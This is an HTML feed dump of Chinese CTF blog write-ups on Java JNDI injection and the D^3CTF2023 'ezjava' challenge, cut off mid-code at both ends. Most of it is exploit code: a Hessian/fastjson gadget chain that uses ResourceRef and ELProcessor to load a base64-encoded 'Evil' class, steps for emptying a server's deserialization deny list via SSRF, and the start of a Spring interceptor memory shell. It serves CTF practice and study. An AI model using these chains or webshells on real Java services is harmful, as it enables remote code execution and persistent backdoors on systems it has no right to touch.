class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(a);<span class="hljs-comment">//        ObjectInputStream inputStream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><span class="hljs-comment">//        inputStream.readObject();</span>    &#125;    public static Field get<span class="hljs-constructor">Field(<span class="hljs-params">final</span> Class&lt;?&gt; <span class="hljs-params">clazz</span>, <span class="hljs-params">final</span> String <span class="hljs-params">fieldName</span>)</span> &#123;        Field field = null;        <span class="hljs-keyword">try</span> &#123;            field = clazz.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;            field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        &#125; catch (NoSuchFieldException ex) &#123;            <span class="hljs-keyword">if</span> (clazz.get<span class="hljs-constructor">Superclass()</span> != null)                field = get<span class="hljs-constructor">Field(<span class="hljs-params">clazz</span>.<span class="hljs-params">getSuperclass</span>()</span>, fieldName);        &#125;        return field;    &#125;    public static void set<span class="hljs-constructor">FieldValue(<span class="hljs-params">final</span> Object <span class="hljs-params">obj</span>, <span class="hljs-params">final</span> String <span class="hljs-params">fieldName</span>, <span class="hljs-params">final</span> Object <span class="hljs-params">value</span>)</span> throws Exception &#123;        final Field field = get<span class="hljs-constructor">Field(<span class="hljs-params">obj</span>.<span class="hljs-params">getClass</span>()</span>, fieldName);        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        <span class="hljs-keyword">if</span>(field != null) &#123;            field.set(obj, value);        &#125;    &#125;&#125;</code></pre></div><p>有细节</p><div class="code-wrapper"><pre><code class="hljs">    setFieldValue(druidDataSource,&quot;logWriter&quot;,null);    setFieldValue(druidDataSource,&quot;statLogger&quot;,null);    setFieldValue(druidDataSource,&quot;transactionHistogram&quot;,null);    setFieldValue(druidDataSource,&quot;initedLatch&quot;,null);</code></pre></div><p>这些属性初始值是被实例化的对象，但是他们不可序列化，设置为null即可</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426191038095.png" alt="image-20240426191038095"></p><p>当然运行环境是在jdk17，所以vm options自行添加</p><h5 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h5><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426191821067.png" alt="image-20240426191821067"></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426191758373.png" alt="image-20240426191758373"></p><h2 id="相似方法的题目"><a href="#相似方法的题目" class="headerlink" title="相似方法的题目"></a>相似方法的题目</h2><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426193525666.png" alt="image-20240426193525666"></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426193547665.png" alt="image-20240426193547665"></p><p>额，过滤很简单</p><p>jackson+signedObject二次反序列化，秒了</p><p>这里文章也提出了从原生反序列化到jndi注入的LDAPAttribute利用链</p><p>然后LDAP服务端放的是jackson的反序列化链</p><p>就这样</p><h2 id="HZNUCTF-2023-final-ezjava"><a href="#HZNUCTF-2023-final-ezjava" class="headerlink" title="[HZNUCTF 2023 final]ezjava"></a>[HZNUCTF 2023 final]ezjava</h2><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426194606660.png" alt="image-20240426194606660"></p><p>一眼log4j，并且log4j本质就是ldap</p><p>这里提示fastjson就是利用高版本绕过，LDAP服务端放的是fastjson的反序列化链</p><p>ok，结束</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://exp10it.io/2022/12/jndi-%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/">https://exp10it.io/2022/12/jndi-%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/</a></p><p><a href="https://exp10it.io/2024/02/n1ctf-junior-2024-web-official-writeup/[](https://boogipop.com/2024/02/05/2024%20N1CTF%20Junior%20Web%20Writeup/)">https://exp10it.io/2024/02/n1ctf-junior-2024-web-official-writeup/[](https://boogipop.com/2024/02/05/2024%20N1CTF%20Junior%20Web%20Writeup/)</a></p><p><a href="https://boogipop.com/2024/02/05/2024%20N1CTF%20Junior%20Web%20Writeup/">https://boogipop.com/2024/02/05/2024%20N1CTF%20Junior%20Web%20Writeup/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>D^3CTF2023--ezjava</title>
    <link href="/2024/04/15/D-3CTF2023-ezjava/"/>
    <url>/2024/04/15/D-3CTF2023-ezjava/</url>
    
    <content type="html"><![CDATA[<h1 id="D3CTF2023-ezjava"><a href="#D3CTF2023-ezjava" class="headerlink" title="D3CTF2023 ezjava"></a>D3CTF2023 ezjava</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>拖了一个月，也不是忙，就是懒起来了</p><p>痛苦啊，每到3-4月都跟个废物一样</p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-meta">@RestController</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainController</span> &#123;    <span class="hljs-keyword">public</span> MainController() &#123;    &#125;    <span class="hljs-meta">@Operation(</span><span class="hljs-meta">        description = <span class="hljs-string">&quot;hello for all&quot;</span></span><span class="hljs-meta">    )</span>    <span class="hljs-meta">@GetMapping(&#123;<span class="hljs-string">&quot;/&quot;</span>&#125;)</span>    <span class="hljs-keyword">public</span> String hello() &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;    &#125;    <span class="hljs-meta">@Operation(</span><span class="hljs-meta">        description = <span class="hljs-string">&quot;registry will request client &#x27;/status&#x27; to get client status.&quot;</span></span><span class="hljs-meta">    )</span>    <span class="hljs-meta">@GetMapping(&#123;<span class="hljs-string">&quot;/client/status&quot;</span>&#125;)</span>    <span class="hljs-keyword">public</span> Result clientStatus() &#123;        <span class="hljs-keyword">try</span> &#123;            String json = Request.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;http://server:8080/status&quot;</span>);            <span class="hljs-keyword">return</span> (Result)JSON.parseObject(json, Result.<span class="hljs-keyword">class</span>);        &#125; <span class="hljs-keyword">catch</span> (Exception var2) &#123;            <span class="hljs-keyword">return</span> Result.of(<span class="hljs-string">&quot;500&quot;</span>, <span class="hljs-string">&quot;client is down&quot;</span>);        &#125;    &#125;    <span class="hljs-meta">@Operation(</span><span class="hljs-meta">        description = <span class="hljs-string">&quot;return serialized blacklist for client. Client will require blacklist every 10 sec.&quot;</span></span><span class="hljs-meta">    )</span>    <span class="hljs-meta">@GetMapping(&#123;<span class="hljs-string">&quot;/blacklist/jdk/get&quot;</span>&#125;)</span>    <span class="hljs-keyword">public</span> Result getBlacklist() &#123;        String <span class="hljs-keyword">data</span> = <span class="hljs-string">&quot;&quot;</span>;        String code = <span class="hljs-string">&quot;200&quot;</span>;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">data</span> = DefaultSerializer.serialize(Blacklist.readBlackList(<span class="hljs-string">&quot;security/jdk_blacklist.txt&quot;</span>));        &#125; <span class="hljs-keyword">catch</span> (Exception var4) &#123;            <span class="hljs-keyword">data</span> = var4.getMessage();            code = <span class="hljs-string">&quot;500&quot;</span>;        &#125;        <span class="hljs-keyword">return</span> Result.of(<span class="hljs-string">&quot;200&quot;</span>, <span class="hljs-keyword">data</span>);    &#125;    <span class="hljs-meta">@Operation(</span><span class="hljs-meta">        description = <span class="hljs-string">&quot;get serialized blacklist for registry&quot;</span></span><span class="hljs-meta">    )</span>    <span class="hljs-meta">@GetMapping(&#123;<span class="hljs-string">&quot;/blacklist/hessian/get&quot;</span>&#125;)</span>    <span class="hljs-keyword">public</span> Result getHessianBlacklist() &#123;        String <span class="hljs-keyword">data</span> = <span class="hljs-string">&quot;&quot;</span>;        String code = <span class="hljs-string">&quot;200&quot;</span>;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">data</span> = DefaultSerializer.serialize(Blacklist.hessianBlackList);        &#125; <span class="hljs-keyword">catch</span> (Exception var4) &#123;            <span class="hljs-keyword">data</span> = var4.getMessage();            code = <span class="hljs-string">&quot;500&quot;</span>;        &#125;        <span class="hljs-keyword">return</span> Result.of(<span class="hljs-string">&quot;200&quot;</span>, <span class="hljs-keyword">data</span>);    &#125;    <span class="hljs-meta">@Operation(</span><span class="hljs-meta">        description = <span class="hljs-string">&quot;deserialize base64Str using hessian&quot;</span></span><span class="hljs-meta">    )</span>    <span class="hljs-meta">@PostMapping(&#123;<span class="hljs-string">&quot;/hessian/deserialize&quot;</span>&#125;)</span>    <span class="hljs-keyword">public</span> Result deserialize(String base64Str) &#123;        String <span class="hljs-keyword">data</span> = <span class="hljs-string">&quot;&quot;</span>;        String code = <span class="hljs-string">&quot;200&quot;</span>;        <span class="hljs-keyword">try</span> &#123;            byte[] serialized = Base64.getDecoder().decode(base64Str);            HessianSerializer.deserialize(serialized);            <span class="hljs-keyword">data</span> = <span class="hljs-string">&quot;deserialize success&quot;</span>;        &#125; <span class="hljs-keyword">catch</span> (Exception var5) &#123;            <span class="hljs-keyword">data</span> = <span class="hljs-string">&quot;error: &quot;</span> + var5.getMessage();            code = <span class="hljs-string">&quot;500&quot;</span>;        &#125;        <span class="hljs-keyword">return</span> Result.of(code, <span class="hljs-keyword">data</span>);    &#125;&#125;</code></pre></div><p>server端代码</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> long lastTimestamp = 0L;    <span class="hljs-keyword">public</span> <span class="hljs-title class_">IndexController</span>() &#123;    &#125;    <span class="hljs-meta">@GetMapping</span>(&#123;<span class="hljs-string">&quot;/status&quot;</span>&#125;)    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Result</span> <span class="hljs-title function_">status</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-title class_">String</span> msg;        <span class="hljs-keyword">try</span> &#123;            long currentTimestamp = <span class="hljs-title class_">System</span>.<span class="hljs-title function_">currentTimeMillis</span>();            msg = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;client %s is online&quot;</span>, <span class="hljs-title class_">InetAddress</span>.<span class="hljs-title function_">getLocalHost</span>().<span class="hljs-title function_">getHostName</span>());            <span class="hljs-keyword">if</span> (currentTimestamp - lastTimestamp &gt; 10000L) &#123;                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">update</span>();                lastTimestamp = <span class="hljs-title class_">System</span>.<span class="hljs-title function_">currentTimeMillis</span>();            &#125;        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> var4) &#123;            msg = <span class="hljs-string">&quot;client is online&quot;</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Result</span>.<span class="hljs-title function_">of</span>(<span class="hljs-string">&quot;200&quot;</span>, msg);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-title class_">String</span> registry = <span class="hljs-string">&quot;http://registry:8080/blacklist/jdk/get&quot;</span>;            <span class="hljs-title class_">String</span> json = <span class="hljs-title class_">Request</span>.<span class="hljs-title function_">get</span>(registry);            <span class="hljs-title class_">Result</span> result = (<span class="hljs-title class_">Result</span>)<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parseObject</span>(json, <span class="hljs-title class_">Result</span>.<span class="hljs-property">class</span>);            <span class="hljs-title class_">Object</span> msg = result.<span class="hljs-title function_">getMessage</span>();            <span class="hljs-keyword">if</span> (msg <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span>) &#123;                byte[] data = <span class="hljs-title class_">Base64</span>.<span class="hljs-title function_">getDecoder</span>().<span class="hljs-title function_">decode</span>((<span class="hljs-title class_">String</span>)msg);                denyClasses = (<span class="hljs-title class_">List</span>)<span class="hljs-title class_">DefaultSerializer</span>.<span class="hljs-title function_">deserialize</span>(data, denyClasses);            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (msg <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">List</span>) &#123;                denyClasses = (<span class="hljs-title class_">List</span>)msg;            &#125;        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> var6) &#123;            var6.<span class="hljs-title function_">printStackTrace</span>();        &#125;    &#125;&#125;</code></pre></div><h2 id="register"><a href="#register" class="headerlink" title="register"></a>register</h2><p>注册端代码漏洞很明显</p><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-meta">@PostMapping(&#123;<span class="hljs-string">&quot;/hessian/deserialize&quot;</span>&#125;)</span><span class="hljs-keyword">public</span> Result deserialize(String base64Str) &#123;    String <span class="hljs-keyword">data</span> = <span class="hljs-string">&quot;&quot;</span>;    String code = <span class="hljs-string">&quot;200&quot;</span>;    <span class="hljs-keyword">try</span> &#123;        byte[] serialized = Base64.getDecoder().decode(base64Str);        HessianSerializer.deserialize(serialized);        <span class="hljs-keyword">data</span> = <span class="hljs-string">&quot;deserialize success&quot;</span>;    &#125; <span class="hljs-keyword">catch</span> (Exception var5) &#123;        <span class="hljs-keyword">data</span> = <span class="hljs-string">&quot;error: &quot;</span> + var5.getMessage();        code = <span class="hljs-string">&quot;500&quot;</span>;    &#125;    <span class="hljs-keyword">return</span> Result.of(code, <span class="hljs-keyword">data</span>);&#125;</code></pre></div><p>读取黑名单，然后进行hessian反序列化</p><p>因为 registry 的黑名单没有包含 fastjson2 的依赖, 所以可以打 fastjson2 toString 触发任意 getter, 然后通过 ContinuationContext 的 getTargetContext 触发 reference 注入</p><div class="code-wrapper"><pre><code class="hljs reasonml">package Hessian;import com.alibaba.fastjson.JSONObject;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.sun.jndi.rmi.registry.ReferenceWrapper;import com.sun.org.apache.xml.internal.utils.FastStringBuffer;import com.sun.org.apache.xpath.internal.objects.XString;import javassist.ClassPool;import javassist.CtClass;import org.apache.naming.ResourceRef;import sun.reflect.ReflectionFactory;import javax.naming.CannotProceedException;import javax.naming.StringRefAddr;import javax.naming.directory.DirContext;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.lang.reflect.Array;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.Base64;import java.util.HashMap;import java.util.Hashtable;<span class="hljs-comment">/*</span><span class="hljs-comment">    javax.naming.spi.ContinuationDirContext 的getter加载任意类</span><span class="hljs-comment">    然后这个地方要用jdk高版本绕过的方法，加载本地factory</span><span class="hljs-comment"> */</span>public <span class="hljs-keyword">class</span> Continuation_getter &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        ClassPool pool = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassPool</span>.</span></span>get<span class="hljs-constructor">Default()</span>;        CtClass clazz = pool.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SpringInterceptorBehinderForEzJava</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>);        clazz.set<span class="hljs-constructor">Name(<span class="hljs-string">&quot;Evil&quot;</span>)</span>;        String clazz_base64 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">clazz</span>.<span class="hljs-params">toBytecode</span>()</span>);        String x = <span class="hljs-string">&quot;var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64(&#x27;&quot;</span> + clazz_base64 + <span class="hljs-string">&quot;&#x27;);\n&quot;</span> +                <span class="hljs-string">&quot;var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n&quot;</span> +                <span class="hljs-string">&quot;var method = java.lang.ClassLoader.class.getDeclaredMethod(&#x27;defineClass&#x27;, &#x27;&#x27;.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n&quot;</span> +                <span class="hljs-string">&quot;method.setAccessible(true);\n&quot;</span> +                <span class="hljs-string">&quot;var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n&quot;</span> +                <span class="hljs-string">&quot;clazz.newInstance();&quot;</span>;        ResourceRef resourceRef = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ResourceRef(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, (String)</span>null, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)null);        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-constructor">StringRefAddr(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;pupi1=eval&quot;</span>)</span>);        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-constructor">StringRefAddr(<span class="hljs-string">&quot;pupi1&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;js\&quot;).eval(\&quot;&quot;</span>+ <span class="hljs-params">x</span> +<span class="hljs-string">&quot;\&quot;)&quot;</span>)</span>);        ReferenceWrapper referenceWrapper = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ReferenceWrapper(<span class="hljs-params">resourceRef</span>)</span>;        Class&lt;?&gt; ccCl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;javax.naming.spi.ContinuationDirContext&quot;</span>)</span>; <span class="hljs-comment">//$NON-NLS-1$</span>        Constructor&lt;?&gt; ccCons = ccCl.get<span class="hljs-constructor">DeclaredConstructor(CannotProceedException.<span class="hljs-params">class</span>, Hashtable.<span class="hljs-params">class</span>)</span>;        ccCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        CannotProceedException cpe = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CannotProceedException()</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">cpe</span>, <span class="hljs-string">&quot;cause&quot;</span>, <span class="hljs-params">null</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">cpe</span>, <span class="hljs-string">&quot;stackTrace&quot;</span>, <span class="hljs-params">null</span>)</span>;        cpe.set<span class="hljs-constructor">ResolvedObj(<span class="hljs-params">resourceRef</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">cpe</span>, <span class="hljs-string">&quot;suppressedExceptions&quot;</span>, <span class="hljs-params">null</span>)</span>;        DirContext ctx = (DirContext) ccCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">cpe</span>, <span class="hljs-params">new</span> Hashtable&lt;&gt;()</span>);<span class="hljs-comment">//        jdk.nashorn.internal.objects.NativeString str = new jdk.nashorn.internal.objects.NativeString();</span>        JSONObject jsonObject = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JSONObject()</span>;        jsonObject.put(<span class="hljs-string">&quot;Pupi1&quot;</span>,ctx);        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        Hessian2Output out = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Output(<span class="hljs-params">baos</span>)</span>;        baos.write(<span class="hljs-number">67</span>);        out.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;        out.write<span class="hljs-constructor">Object(<span class="hljs-params">jsonObject</span>)</span>;        out.flush<span class="hljs-constructor">Buffer()</span>;        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>);        Hessian2Input input = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Input(<span class="hljs-params">bais</span>)</span>;        <span class="hljs-comment">//input.readObject();</span>        String ret = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(ret);    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithoutConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;        return create<span class="hljs-constructor">WithConstructor(<span class="hljs-params">classToInstantiate</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">new</span> Class[0], <span class="hljs-params">new</span> Object[0])</span>;    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>, Class&lt;? <span class="hljs-params">super</span> T&gt; <span class="hljs-params">constructorClass</span>, Class&lt;?&gt;[] <span class="hljs-params">consArgTypes</span>, Object[] <span class="hljs-params">consArgs</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;        Constructor&lt;? super T&gt; objCons = constructorClass.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">consArgTypes</span>)</span>;        objCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Constructor&lt;?&gt; sc = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectionFactory</span>.</span></span>get<span class="hljs-constructor">ReflectionFactory()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">ConstructorForSerialization(<span class="hljs-params">classToInstantiate</span>, <span class="hljs-params">objCons</span>)</span>;        sc.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        return (T) sc.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">consArgs</span>)</span>;    &#125;    public static HashMap&lt;Object, Object&gt; makeMap ( Object v1, Object v2 ) throws Exception &#123;        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;size&quot;</span>, 2)</span>;        Class&lt;?&gt; nodeC;        <span class="hljs-keyword">try</span> &#123;            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>)</span>;        &#125;        catch ( ClassNotFoundException e ) &#123;            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>)</span>;        &#125;        Constructor&lt;?&gt; nodeCons = nodeC.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">int</span>.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">nodeC</span>)</span>;        nodeCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Object tbl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">nodeC</span>, 2)</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">0</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v1</span>, <span class="hljs-params">v1</span>, <span class="hljs-params">null</span>)</span>);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">1</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v2</span>, <span class="hljs-params">v2</span>, <span class="hljs-params">null</span>)</span>);        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;table&quot;</span>, <span class="hljs-params">tbl</span>)</span>;        return s;    &#125;    public static Field get<span class="hljs-constructor">Field(<span class="hljs-params">final</span> Class&lt;?&gt; <span class="hljs-params">clazz</span>, <span class="hljs-params">final</span> String <span class="hljs-params">fieldName</span>)</span> &#123;        Field field = null;        <span class="hljs-keyword">try</span> &#123;            field = clazz.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;            field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        &#125; catch (NoSuchFieldException ex) &#123;            <span class="hljs-keyword">if</span> (clazz.get<span class="hljs-constructor">Superclass()</span> != null)                field = get<span class="hljs-constructor">Field(<span class="hljs-params">clazz</span>.<span class="hljs-params">getSuperclass</span>()</span>, fieldName);        &#125;        return field;    &#125;    public static void set<span class="hljs-constructor">FieldValue(<span class="hljs-params">final</span> Object <span class="hljs-params">obj</span>, <span class="hljs-params">final</span> String <span class="hljs-params">fieldName</span>, <span class="hljs-params">final</span> Object <span class="hljs-params">value</span>)</span> throws Exception &#123;        final Field field = get<span class="hljs-constructor">Field(<span class="hljs-params">obj</span>.<span class="hljs-params">getClass</span>()</span>, fieldName);        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        <span class="hljs-keyword">if</span>(field != null) &#123;            field.set(obj, value);        &#125;    &#125;&#125;</code></pre></div><p>关于代码实现问题不做解释，因为我也不会，后续再学习</p><p>这里主要还是解释原因</p><h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><p>然后就可以看server端代码</p><p>漏洞也很明显</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">try</span> &#123;    String registry = <span class="hljs-string">&quot;http://registry:8080/blacklist/jdk/get&quot;</span>;    String json = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Request</span>.</span></span>get(registry);    Result result = (Result)<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse<span class="hljs-constructor">Object(<span class="hljs-params">json</span>, Result.<span class="hljs-params">class</span>)</span>;    Object msg = result.get<span class="hljs-constructor">Message()</span>;    <span class="hljs-keyword">if</span> (msg instanceof String) &#123;        byte<span class="hljs-literal">[]</span> data = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Decoder()</span>.decode((String)msg);        denyClasses = (List)<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DefaultSerializer</span>.</span></span>deserialize(data, denyClasses);</code></pre></div><p>我们发现他会请求注册端的<code>/blacklist/jdk/get</code>，然后根据反序列化的结果更新服务端的黑名单</p><p>所以我们伪造一串不存在的List数据返回给他，从而起到所谓“置空”黑名单的效果（实际黑名单不能为空）</p><p>然后再返回正常打反序列化的数据即可，没有黑名单，打fastjson原生反序列化即可</p><p>但是如何触发到这个内网server端的路由呢</p><p>一是可以拿到register的shell后，通过curl去访问</p><p>二是通过代码可以发现能够通过<code>register的/client/status请求到server的/status</code></p><div class="code-wrapper"><pre><code class="hljs awk">register的<span class="hljs-regexp">/client/</span>status   请求     server的/status然后server的<span class="hljs-regexp">/status        又会请求   register的/</span>blacklist<span class="hljs-regexp">/jdk/g</span>et拿到黑名单</code></pre></div><p>根据自己的做法，对应的写打入server端的内存马即可</p><p>register端的内存马</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Hessian;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<span class="hljs-keyword">import</span> org.springframework.web.context.support.WebApplicationContextUtils;<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<span class="hljs-keyword">import</span> javax.crypto.Cipher;<span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<span 